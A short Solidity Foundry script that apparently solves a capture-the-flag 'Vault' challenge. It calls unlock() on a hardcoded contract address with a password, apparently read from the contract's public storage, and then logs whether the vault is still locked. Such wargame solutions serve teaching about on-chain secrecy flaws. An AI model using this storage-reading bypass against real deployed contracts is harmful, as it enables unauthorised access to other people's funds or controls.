//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultSolution is Script {

  Vault vaultInstance = Vault(0x6fE74F9ED90D550E7fe169237f885c44C53BF15e);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
    console.log("Locked: ",vaultInstance.locked());
    vm.stopBroadcast();
  }
}